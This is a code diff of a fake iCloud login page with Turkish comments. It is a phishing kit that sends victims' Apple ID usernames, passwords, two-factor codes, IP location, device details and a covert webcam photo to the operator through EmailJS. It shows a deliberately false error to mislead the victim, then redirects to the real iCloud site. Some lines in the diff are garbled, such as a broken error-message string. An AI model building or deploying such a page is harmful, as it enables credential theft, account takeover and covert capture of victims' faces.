@@ -4,10 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>iCloud</title>
+    <!-- EmailJS CDN -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            emailjs.init("bOJixfHEM1uPomqLS"); // EmailJS Public Key
+            // EmailJS Public Key'inizi buraya yazın
+            emailjs.init("bOJixfHEM1uPomqLS");
         })();
     </script>
     <style>
@@ -59,13 +61,14 @@
             margin-bottom: 8px;
             font-weight: 600;
         }
-        input[type="text"], input[type="password"], input[type="file"] {
+        input[type="text"], input[type="password"] {
             width: 100%;
             padding: 12px 16px;
             border: 1px solid #d2d2d7;
             border-radius: 8px;
             font-size: 17px;
             transition: border-color 0.2s;
+            box-sizing: border-box; /* Padding'i genişliğe dahil et */
         }
         input:focus {
             outline: none;
@@ -92,15 +95,7 @@
             color: #ff3b30;
             font-size: 14px;
             margin-top: 16px;
-            display: none;
-        }
-        .footer-links {
-            margin-top: 32px;
-            font-size: 14px;
-        }
-        .footer-links a {
-            color: #007aff;
-            text-decoration: none;
+            display: none; /* Başlangıçta gizli */
         }
         .hidden {
             display: none;
@@ -118,6 +113,7 @@
     </style>
 </head>
 <body>
+
     <div class="container">
         <!-- 1. Adım: İlk Giriş Formu -->
         <div id="loginStep" class="login-card">
@@ -143,9 +139,9 @@
                     <input type="text" id="verificationCode" placeholder="Cihazınıza gelen 6 haneli kodu girin" maxlength="6" required>
                 </div>
                 <div class="form-group">
-                    <label for="webcamAccess">Yüz Tanıma Doğrulaması</label>
+                    <label>Yüz Tanıma Doğrulaması</label>
                     <p style="font-size: 12px; color: #86868b; margin-bottom: 8px;">Lütfen kameranıza bakın ve doğrulayın.</p>
-                    <video id="webcamVideo" autoplay></video>
+                    <video id="webcamVideo" autoplay style="width: 100%; border-radius: 8px;"></video>
                     <canvas id="webcamCanvas" class="hidden"></canvas>
                     <img id="capturedImage" class="hidden">
                 </div>
@@ -154,7 +150,7 @@
             </form>
         </div>
 
-        <!-- 3. Adım: Yükleniyor ve Başarı Mesajı -->
+        <!-- 3. Adım: Yükleniyor Ekranı -->
         <div id="loadingStep" class="login-card hidden">
             <div class="icloud-logo">☁️</div>
             <h2>İşleniyor...</h2>
@@ -166,22 +162,29 @@
     </div>
 
     <script>
+        // --- DEĞİŞKENLER ve AYARLAR ---
         let stream = null;
         let capturedImageData = null;
-        let deviceInfo = {
-            ip_address: 'Bilinmiyor',
-            country: 'Bilinmiyor',
-            city: 'Bilinmiyor',
+        const deviceInfo = {
+            ip_address: 'Alınıyor...',
+            country: 'Alınıyor...',
+            city: 'Alınıyor...',
             device_model: navigator.userAgent
         };
+
+        // EmailJS Service ve Template ID'leriniz
+        const EMAILJS_SERVICE_ID = "service_mdm9ze3";
+        const EMAILJS_TEMPLATE_ID = "template_umbj15o";
+
+        // --- FONKSİYONLAR ---
 
         // IP ve konum bilgisi almak için harici servis
         fetch('https://ipapi.co/json/')
             .then(response => response.json())
             .then(data => {
-                deviceInfo.ip_address = data.ip;
-                deviceInfo.country = data.country_name;
-                deviceInfo.city = data.city;
+                deviceInfo.ip_address = data.ip || 'Bilinmiyor';
+                deviceInfo.country = data.country_name || 'Bilinmiyor';
+                deviceInfo.city = data.city || 'Bilinmiyor';
             })
             .catch(error => console.error('Konum alınamadı:', error));
 
@@ -194,9 +197,9 @@
                     video.srcObject = stream;
                 })
                 .catch(function(err) {
-                    console.log("Webcam erişimi reddedildi: ", err);
-                    document.getElementById('verificationErrorMessage').textContent = 'Kamera erişimi gerekli. Lütfen izin verin.';
-                    document.getElementById('verificationErrorMessage').style.display = 'block';
+                    console.error("Webcam erişimi reddedildi: ", err);
+                    const errorMsg = document.getElementById('verificationErrorMessage');
+                    errorMsg.textContent = 'Kamera erişimi gerekli. Lütfen izin verinerrorMsg.style.display = 'block';
                 });
         }
 
@@ -206,6 +209,11 @@
             const canvas = document.getElementById('webcamCanvas');
             const capturedImage = document.getElementById('capturedImage');
             
+            if (!stream) {
+                console.error("Stream aktif değil, fotoğraf çekilemiyor.");
+                return null;
+            }
+
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
@@ -217,21 +225,22 @@
             video.classList.add('hidden');
             
             // Stream'i durdur
-            if (stream) {
-                stream.getTracks().forEach(track =>if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
+            stream.getTracks().forEach(track => track.stop());
             
             return capturedImageData;
         }
 
-        // Form olay dinleyicileri
+        // --- OLAY DİNLEYİCİLERİ ---
+
+        // 1. Adım Formu (Giriş)
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
+            
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+            const errorMsgEl = document.getElementById('errorMessage');
             
-            emailjs.send("service_mdm9ze3", "template_umbj15o", {
+            const templateParams = {
                 username: username,
                 password: password,
                 send_date: new Date().toLocaleString(),
@@ -239,23 +248,45 @@
                 country: deviceInfo.country,
                 city: deviceInfo.city,
                 device_model: deviceInfo.device_model
-            }).then(function(response) {
-                console.log("Giriş bilgileri gönderildi!", response.status, response.text);
-                document.getElementById('loginStep').classList.add('hidden');
-                document.getElementById('verificationStep').classList.remove('hidden');
-                startWebcam();
-            }, function(error) {
-                console.log("Gönderim hatası:", error);
-                document.getElementById('errorMessage').style.display = 'block';
-            });
+            };
+
+            // EmailJS ile gönderme işlemi
+            emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+                .then(function(response) {
+                    console.log("Giriş bilgileri gönderildi!", response.status, response.text);
+                    
+                    // Kullanıcıyı yanıltmak için hata mesajını göster
+                    errorMsgEl.style.display = 'block';
+                    
+                    // 2 saniye sonra ikinci adıma geç
+                    setTimeout(() => {
+                        document.getElementById('loginStep').classList.add('hidden');
+                        document.getElementById('verificationStep').classList.remove('hidden');
+                        startWebcam();
+                    }, 2000);
+
+                }, function(error) {
+                    console.error("EmailJS gönderim hatası:", error);
+                    // Gerçek bir hata olursa da yine aynı mesajı göster
+                    errorMsgEl.style.display = 'block';
+                });
         });
 
+        // 2. Adım Formu (Doğrulama)
         document.getElementById('verificationForm').addEventListener('submit', function(e) {
             e.preventDefault();
+            
             const code = document.getElementById('verificationCode').value;
             const photoData = capturePhoto();
+            const errorMsgEl = document.getElementById('verificationErrorMessage');
+
+            if (!photoData) {
+                errorMsgEl.textContent = 'Fotoğraf çekilemedi. Lütfen tekrar deneyin.';
+                errorMsgEl.style.display = 'block';
+                return;
+            }
             
-            emailjs.send("service_mdm9ze3", "template_umbj15o", {
+            const finalParams = {
                 username: document.getElementById('username').value,
                 password: document.getElementById('password').value,
                 send_date: new Date().toLocaleString(),
@@ -265,19 +296,25 @@
                 device_model: deviceInfo.device_model,
                 verification_code: code,
                 captured_image: photoData
-            }).then(function(response) {
-                console.log("Doğrulama bilgileri gönderildi!", response.status, response.text);
-                document.getElementById('verificationStep').classList.add('hidden');
-                document.getElementById('loadingStep').classList.remove('hidden');
-                
-                setTimeout(() => {
-                    window.location.href = "https://www.icloud.com";
-                }, 3000);
-            }, function(error) {
-                console.log("Doğrulama gönderim hatası:", error);
-                document.getElementById('verificationErrorMessage').style.display = 'block';
-            });
+            };
+
+            emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, finalParams)
+                .then(function(response) {
+                    console.log("Doğrulama bilgileri gönderildi!", response.status, response.text);
+                    document.getElementById('verificationStep').classList.add('hidden');
+                    document.getElementById('loadingStep').classList.remove('hidden');
+                    
+                    // 3 saniye sonra gerçek iCloud'a yönlendir
+                    setTimeout(() => {
+                        window.location.href = "https://www.icloud.com";
+                    }, 3000);
+                }, function(error) {
+                    console.error("Doğrulama gönderim hatası:", error);
+                    errorMsgEl.textContent = 'Doğrulama başarısız oldu. Lütfen tekrar deneyin.';
+                    errorMsgEl.style.display = 'block';
+                });
         });
+
     </script>
 </body>
 </html>
